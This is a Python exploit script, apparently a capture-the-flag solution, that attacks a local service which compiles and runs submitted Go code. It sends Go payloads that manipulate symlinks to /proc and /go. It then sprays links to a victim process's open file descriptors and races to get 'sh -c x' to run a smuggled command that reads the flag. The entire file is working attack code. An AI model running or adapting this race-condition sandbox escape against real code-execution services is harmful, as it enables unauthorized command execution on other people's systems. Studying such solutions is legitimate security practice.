#!/usr/bin/env python3

import threading
import time
from pwn import context, remote

context.log_level = "error"

HOST, PORT = ("127.0.0.1", 1337)
PID_MIN = 1400
PID_MAX = 2000
FD_MIN = 3
FD_MAX = 12
VICTIMS = 4
ATTACKERS = 8
PACE = 0.01
TIMEOUT = 20.0

VICTIM = b'///readflag pls>/tmp/f;exit\npackage main\nimport "C"\nfunc main(){for{}}'
RM_P = b'package main;import ."os";func main(){Remove("/p")}'
RM_G = b'package main;import ."os";func main(){Remove("/g")}'
RM_GX = b'package main;import ."os";func main(){Remove("/g/x")}'
RM_X = b'package main;import ."os";func main(){Remove("/go/bin/x")}'
RM_R = b'package main;import ."os";func main(){Remove("/tmp/r")}'
MK_P = b'package main;import ."os";func main(){Symlink("/proc","/p")}'
MK_G = b'package main;import ."os";func main(){Symlink("/go","/g")}'
MK_R = b'package main;import ."os";func main(){Symlink("/readflag","/tmp/r")}'
REN_X = b'package main;import ."os";func main(){Rename("/g/x","/go/bin/x")}'
CHMOD_X = b'package main;import ."os";func main(){Chmod("/go/bin/x",0755)}'
TRIGGER = b'package main;import ."os/exec";func main(){Command("sh","-c","x").Run()}'


def send(payload: bytes) -> bytes:
    io = None
    try:
        io = remote(HOST, PORT, timeout=5)
        io.recvuntil(b"\n", timeout=5)
        io.send(payload)
        io.shutdown("send")
        return io.recvrepeat(5)
    except Exception:
        return b""
    finally:
        if io is not None:
            io.close()


def victim_worker() -> None:
    io = remote(HOST, PORT, timeout=0.5)
    io.recvuntil(b"\n", timeout=0.5)
    io.send(VICTIM)
    io.shutdown("send")
    io.recvrepeat(2)
    io.close()


def pid_chunks() -> list[tuple[int, int]]:
    size = max(1, (PID_MAX - PID_MIN + ATTACKERS) // ATTACKERS)
    out = []
    low = PID_MIN
    while low <= PID_MAX:
        high = min(PID_MAX, low + size - 1)
        out.append((low, high))
        low = high + 1
    return out


def spray_worker(stop: threading.Event, pid_low: int, pid_high: int) -> None:
    while not stop.is_set():
        for pid in range(pid_low, pid_high + 1):
            if stop.is_set():
                return
            for fd in range(FD_MIN, FD_MAX + 1):
                if stop.is_set():
                    return
                payload = f'package main;import ."os";func main(){{Symlink("/p/{pid}/fd/{fd}","/g/x")}}'.encode()
                send(payload)
                time.sleep(PACE)


def finish_worker(stop: threading.Event) -> None:
    while not stop.is_set():
        for payload in (RM_X, REN_X, CHMOD_X):
            send(payload)
            time.sleep(PACE)
        out = send(TRIGGER)
        if out:
            print(out.decode(errors="ignore"), end="")
        time.sleep(PACE)


def setup() -> None:
    for payload in (RM_X, RM_GX, RM_R, RM_P, RM_G, MK_R, MK_P, MK_G):
        send(payload)


if __name__ == "__main__":
    setup()

    for _ in range(VICTIMS):
        t = threading.Thread(target=victim_worker, daemon=True)
        t.start()

    stop = threading.Event()
    threads = []

    for pid_low, pid_high in pid_chunks():
        t = threading.Thread(target=spray_worker, args=(stop, pid_low, pid_high), daemon=True)
        t.start()
        threads.append(t)

    t = threading.Thread(target=finish_worker, args=(stop,), daemon=True)
    t.start()
    threads.append(t)

    time.sleep(TIMEOUT)
    stop.set()

    for t in threads:
        t.join(timeout=1)
